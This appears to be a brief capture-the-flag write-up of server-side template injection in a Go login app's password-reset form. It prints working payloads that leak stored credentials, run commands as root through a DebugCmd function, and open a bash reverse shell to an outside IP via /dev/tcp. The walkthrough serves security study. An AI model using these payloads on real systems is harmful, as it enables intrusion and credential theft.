SSTI

Browsing port 80 reveals it is running php. On port 8080 we have a golang server X-Forwarded-Server: golang and it returns a login form. The login form has a /forgot/ form to reset the password. Knowing the site runs in golang with some templating we can attempt SSTI Server Side Template Injection

We try first to POST email={{html "SSTI"}} and we indeed have a response with the html word SSTI. Which means the template has successfully render the word SSTI in html. As per this go SSTI blog post, we can get the data struct being passed as input to the template with {{.}} and it works:

Email Sent To: {1 ippsec@hacking.esports ippsSecretPassword}

We can login with those credentials and we can see the page go source code, with a dangerous function DebugCmd allowing remote code execution as per this PoC:

1

email={{.DebugCmd "id "}} outputs: Email Sent To: uid=0(root) gid=0(root) groups=0(root)

We can craft a reverse shell with

1

email={{.DebugCmd "/usr/bin/bash -c 'exec /usr/bin/bash -i &>/dev/tcp/10.10.14.112/11111 <&1'"}}
